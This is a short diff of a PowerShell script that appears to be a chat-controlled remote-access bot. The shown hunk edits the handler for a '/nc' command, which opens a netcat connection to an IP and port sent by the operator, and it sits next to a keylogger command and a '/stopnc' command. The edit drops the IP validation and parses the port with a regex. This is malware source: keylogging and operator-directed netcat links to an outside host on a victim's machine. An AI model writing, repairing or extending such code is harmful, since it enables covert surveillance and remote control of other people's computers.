@@ -718,16 +718,9 @@ While ($DoNotExit)  {
         keylogger seconds $time
       }
       "/nc $ipV4 *"{
-        $ip = $LastMessageText -replace "/nc $ipV4 ", ""
-	
-        if ($ip -match $ipv4Regex) {
-            $port = $ip -replace '\s*$', ''
-            netcat $ip $port
-        } else {
-            Write-Host "$ip"
-	    Write-Host "$port"
-            Write-Host "$LastMessageText"
-	}
+        $ip = $LastMessageText -replace "/nc $ipV4 ", ""	
+        $port = $ip -replace '(\d{1,3}\.){3}\d{1,3}', ''
+        netcat $ip $port
       }
       "/stopnc $ipV4"{
         stopnetcat
